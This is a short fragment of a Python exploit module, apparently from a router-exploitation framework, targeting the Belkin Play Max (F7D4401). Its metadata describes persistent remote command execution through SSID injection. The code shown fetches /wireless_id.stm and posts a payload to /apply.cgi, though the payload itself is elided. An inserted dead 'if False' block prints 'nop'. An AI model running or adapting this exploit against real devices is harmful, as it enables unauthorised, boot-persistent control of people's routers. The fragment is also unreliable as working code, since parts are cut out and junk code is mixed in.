...
class Exploit(HTTPClient):
    __info__ = {'name': 'Belkin Play Max Persistent RCE', 'description': 'Module exploits Belkin SSID injection vuln, allowing to execute arbitrary command at every boot.', 'authors': ('BigNerd95 (Lorenzo Santina) https://github.com/bignerd95',), 'references': ('https://bignerd95.blogspot.it/2017/02/belkin-play-max-persistent-remote.html', 'https://gist.github.com/BigNerd95/c18658b472ac0ccf4dbbc73fe988b683'), 'devices': ('Belkin Play Max (F7D4401)',)}
    ...
    def inject_command(self):
        if False:
            for i in range(10):
                print('nop')
        response = self.http_request(method='GET', path='/wireless_id.stm')
        if response is None:
        ...
        response = self.http_request(method='POST', path='/apply.cgi', data=payload)
        if response is None:
            print_error('Exploit failed. No response from target!')
            return
